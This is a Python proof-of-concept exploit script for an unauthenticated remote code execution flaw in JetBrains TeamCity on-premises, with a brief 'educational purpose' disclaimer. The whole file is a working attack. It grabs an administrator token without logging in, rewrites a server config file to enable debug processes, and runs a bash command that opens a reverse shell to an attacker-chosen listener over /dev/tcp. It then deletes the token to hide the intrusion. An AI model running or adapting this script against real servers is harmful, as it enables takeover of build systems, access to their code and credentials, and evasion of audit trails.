# References:
# https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/
# http://packetstormsecurity.com/files/174860/JetBrains-TeamCity-Unauthenticated-Remote-Code-Execution.html

# Author: Hot Plugin
# Discaimer: This POC is only for educational purpose

import requests
import base64 


proxy = {
    "http" : "http://127.0.0.1:8080"
}

def main():
    import sys

    if len(sys.argv) != 4:
        print("Usage: {} <target_url> listener_ip listener_port".format(sys.argv[0]))
        sys.exit(1)

    base_url = sys.argv[1]
    rev_ip = sys.argv[2]
    rev_port = sys.argv[3]

    cmd = f"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{rev_ip}%2F{rev_port}%200%3E%261"

    shell = {
        "exePath" : "/bin/bash",
        "param1" : "-c",
        "param2" : cmd
        }

    token_endpoint = "{}/app/rest/users/id:1/tokens/RPC2".format(base_url)
    edit_file_endpoint = "{}/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true".format(base_url)
    rce_endpoint = "{}/app/rest/debug/processes?exePath={}&params={}&params={}".format(base_url, shell['exePath'], shell['param1'], shell['param2'])

    token_req = requests.post(token_endpoint)
    if token_req.status_code == 400:
        requests.delete(token_endpoint, headers={'Connection':'close'})
        token_req = requests.post(token_endpoint, proxies=proxy)
    bearer_token = token_req.text.split('value="')[1].split('"')[0]
    # print(bearer_token)

    edit_file_response = requests.post(edit_file_endpoint, headers={"Authorization": "Bearer {}".format(bearer_token)}).text

    response = requests.post(rce_endpoint, headers={"Authorization": "Bearer {}".format(bearer_token)}).text
    response_output = response

    requests.delete(token_endpoint, headers={"Authorization": "Bearer {}".format(bearer_token)})

    # print(response_output)

if __name__ == "__main__":
    main()
